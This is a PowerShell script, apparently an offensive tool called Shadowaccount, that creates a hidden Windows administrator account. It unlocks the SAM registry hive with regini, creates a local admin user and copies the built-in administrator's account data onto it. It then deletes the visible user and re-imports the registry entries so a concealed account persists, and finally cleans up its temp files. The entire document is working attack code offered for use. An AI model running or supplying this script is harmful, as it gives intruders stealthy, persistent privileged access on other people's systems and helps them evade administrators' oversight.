function Shadowaccount{
     [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)]
        [String]
        $username = "",
  
        [Parameter(Mandatory=$true)]
        [String]
        $password = "",
  
        [Parameter(Mandatory=$false)]
        [String]
        $admin = "administrator"
    )
function Empower{
    "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\up.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"| Out-File -Append  $env:temp\up.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]" | Out-File -Append  $env:temp\up.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "| Out-File -Append  $env:temp\up.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "| Out-File -Append  $env:temp\up.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"| Out-File -Append  $env:temp\up.ini
    cmd /c "regini $env:temp\up.ini"
    Remove-Item $env:temp\up.ini
}
function Disqualify{
    "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\down.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM [17]"| Out-File -Append  $env:temp\down.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]" | Out-File -Append  $env:temp\down.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "| Out-File -Append  $env:temp\down.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "| Out-File -Append  $env:temp\down.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"| Out-File -Append  $env:temp\down.ini
    cmd /c "regini $env:temp\down.ini"
    Remove-Item $env:temp\down.ini
}
function Creat_user([string]$username,[string]$password){
    $group = "Administrators"
    $existing = Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$username"
    if (!$existing) {
        Write-Host "[*] Creating new local user $username with password $password"
        & NET USER $username $password /add /y /expires:never | Out-Null
        & NET LOCALGROUP $group $username /add | Out-Null
    }
    else{
        Write-Host "[*] Sorry the user already exists"
        break
    }
    & WMIC USERACCOUNT WHERE "Name='$username'" SET PasswordExpires=FALSE   | Out-Null 
}
function GetUser_key([string]$user){
        cmd /c " echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user [1 17] >> $env:temp\$user.ini"
        cmd /c "regini $env:temp\$user.ini"
        Remove-Item $env:temp\$user.ini
        if(Test-Path -Path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$user"){
            cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user""
            $file = Get-Content "$env:temp\$user.reg"  | Out-String
            $pattern="@=hex\((.*?)\)\:"
            $file -match $pattern | Out-Null
            $key = "00000"+$matches[1]
            return $key
        }else {
            Write-Host "[-] Something Wrong !"
        }
}
function Clone([string]$userkey,[string]$cuserkey){
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$userkey [1 17] "| Out-File $env:temp\f.ini
    "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$cuserkey [1 17] " | Out-File  $env:temp\f.ini
    cmd /c " regini $env:temp\f.ini"
    Remove-Item $env:temp\f.ini
    $ureg = "HKLM:\SAM\SAM\Domains\Account\Users\$userkey" | Out-String
    $cureg = "HKLM:\SAM\SAM\Domains\Account\Users\$cuserkey" | Out-String
    $cuFreg = Get-Item -Path $cureg.Trim()
    $cuFvalue = $cuFreg.GetValue('F')
    Set-ItemProperty -path $ureg.Trim()  -Name "F" -value $cuFvalue
    $outreg = "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$userkey"
    cmd /c "regedit /e $env:temp\out.reg $outreg.Trim()"
}
function Main(){
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){
            Write-Output "Script must be run as administrator" 
            break
        }
    Empower
    if (!(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$admin")) {
        Write-Host "[-]Cannot clone user"
        Write-Host "[-]Because there is no administrator"
        Disqualify
        Write-Host "[-]Exiting"
    }
    else{
        Creat_user $username $password
        $user_key = GetUser_key $username | Out-String
        $admin_key = GetUser_key $admin | Out-String
        Clone $user_key $admin_key
        if ((Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$username")) {
            cmd /c "net User $username /del " |Out-Null
        }
        else{
            Write-Output "[*] Something Wrong !"
        }
        cmd /c "regedit /s $env:temp\$username.reg"
        cmd /c "regedit /s $env:temp\out.reg"
        Remove-Item $env:temp\*.reg
        Disqualify
        Write-Output "[*] Success !"
    }
}
Main
}